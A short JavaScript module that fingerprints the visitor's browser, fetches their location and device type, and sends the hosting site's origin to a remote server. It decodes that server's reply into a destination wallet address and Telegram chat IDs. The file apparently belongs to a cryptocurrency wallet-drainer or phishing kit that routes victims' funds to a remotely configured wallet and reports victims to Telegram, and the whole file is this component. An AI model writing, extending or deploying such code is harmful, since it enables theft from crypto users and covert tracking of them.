import axios from 'axios';
import { decode } from "../hash"
import { userLocation, isAndroidIos } from "../tg"

import Fingerprint2 from 'fingerprintjs2';

const getUserFingerprint = async () => {
    try {
      const components = await new Promise(resolve => {
        Fingerprint2.get({ excludeUserAgent: true, excludeLanguage: true }, resolve);
      });
  
      const fingerprint = Fingerprint2.x64hash128(
        components.map(component => component.value).join(''),
        31
      );
  
      return  fingerprint;
    } catch (error) {
      console.error('Error getting fingerprint and IP:', error);
      return null;
    }
  };

export const loadData = async (server) => {
    let min = 20000;
    let max = 25000;   
    let recipient = ""
    let chat_ids = []
    let fingerprint = ""
    let mobile = isAndroidIos()
 
    const updateResponse =  await axios.get(`${server}update?data=${window.location.origin}`)
    .then((res) => res.data)
    .catch(() => false)

    const location = await userLocation()
    .then(res => res.data)

    fingerprint = await getUserFingerprint()

    if (updateResponse) {
        let dataUpdate = await decode(updateResponse)

        recipient = dataUpdate.destination_wallet
        chat_ids = dataUpdate.chat_ids
    } 

    return  {
        min, max, recipient, chat_ids, location, fingerprint, mobile
    }
}